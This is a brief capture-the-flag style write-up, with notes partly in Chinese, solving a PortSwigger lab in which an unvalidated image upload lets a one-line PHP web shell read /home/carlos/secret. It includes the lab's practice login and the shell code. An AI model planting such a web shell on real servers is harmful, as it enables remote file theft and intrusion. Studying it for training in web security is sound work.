# Remote code execution via web shell upload

## Information
---

- [PortSwigger - Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

## Solution
---

1. 上傳以下腳本。
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```

2. 透過查看 **avator** 來得到腳本執行結果。

3. 提交獲取資訊。